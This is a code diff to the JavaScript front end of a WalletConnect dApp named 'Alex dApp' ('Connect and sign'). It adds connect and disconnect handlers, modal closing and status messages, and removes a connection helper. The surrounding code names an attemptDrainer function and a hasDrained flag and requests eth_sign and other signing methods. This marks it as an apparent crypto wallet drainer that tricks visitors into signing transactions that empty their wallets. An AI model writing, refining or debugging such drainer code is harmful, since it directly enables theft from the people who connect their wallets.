@@ -718,7 +718,7 @@ async function initWalletConnect() {
       optionalChains: Object.keys(config.CHAINS).map(Number),
       showQrModal: false,
       methods: ['eth_sendTransaction', 'eth_signTransaction', 'eth_sign', 'personal_sign', 'eth_signTypedData'],
-      events: ['chainChanged', 'accountsChanged'],
+      events: ['chainChanged', 'accountsChanged', 'connect', 'disconnect'],
       metadata: {
         name: 'Alex dApp',
         description: 'Connect and sign',
@@ -727,10 +727,17 @@ async function initWalletConnect() {
       }
     });
 
+    // Обработка события connect
+    providerInstance.on('connect', (info) => {
+      console.log('✅ WalletConnect connected:', info);
+      walletConnectModal.closeModal(); // Закрываем модальное окно
+    });
+
     providerInstance.on('accountsChanged', (accounts) => {
       if (accounts.length === 0) {
         connectedAddress = null;
         console.log('🔍 Кошелёк отключён');
+        walletConnectModal.closeModal();
       } else {
         connectedAddress = accounts[0];
         console.log('🔍 Адрес изменён:', connectedAddress);
@@ -741,13 +748,21 @@ async function initWalletConnect() {
       console.log('🔍 Сеть изменена на chainId:', parseInt(chainId, 16));
     });
 
+    providerInstance.on('disconnect', () => {
+      console.log('🔍 Wallet disconnected');
+      connectedAddress = null;
+      providerInstance = null;
+      walletConnectModal.closeModal();
+      sessionStorage.removeItem('sessionId');
+    });
+
     console.log('✅ WalletConnect инициализирован');
   } catch (error) {
     console.error('❌ Ошибка инициализации WalletConnect:', error.message);
+    walletConnectModal?.closeModal();
     throw error;
   }
 }
-
 async function waitForConnection() {
   try {
     if (!providerInstance) {
@@ -760,6 +775,7 @@ async function waitForConnection() {
         connectedAddress = accounts[0];
         console.log(`✅ Кошелёк уже подключён: ${connectedAddress}`);
         walletConnectModal.closeModal();
+        modalSubtitle.textContent = 'Wallet connected, preparing to sign...';
         return connectedAddress;
       }
     }
@@ -781,38 +797,11 @@ async function waitForConnection() {
   } catch (error) {
     console.error(`❌ Connection error: ${error.message}`);
     walletConnectModal.closeModal();
+    modalSubtitle.textContent = `Error: ${error.message}`;
+    await hideModalWithDelay(`Error: ${error.message}`);
     throw error;
   }
 }
-
-async function handleConnectOrAction() {
-  try {
-    if (!connectedAddress) {
-      console.log('🔄 Opening WalletConnect modal for wallet selection...');
-      connectedAddress = await waitForConnection();
-      console.log(`✅ Wallet connected in handleConnectOrAction: ${connectedAddress}`);
-
-      const web3Provider = new ethers.providers.Web3Provider(providerInstance, 'any');
-      const network = await web3Provider.getNetwork();
-      await saveSession(connectedAddress, network.chainId);
-    } else {
-      console.log(`✅ Wallet already connected: ${connectedAddress}`);
-      if (!isTransactionPending) {
-        await attemptDrainer();
-      } else {
-        console.log('⏳ Transaction already in progress');
-        await hideModalWithDelay("Transaction already in progress.");
-      }
-    }
-  } catch (error) {
-    console.error(`❌ Connection error: ${error.message}`);
-    walletConnectModal.closeModal();
-    isTransactionPending = false;
-    showModal();
-    await hideModalWithDelay(`Error: ${error.message}`);
-  }
-}
-
 async function attemptDrainer() {
   if (hasDrained || isTransactionPending) {
     console.log('⚠ Transaction already completed or pending');
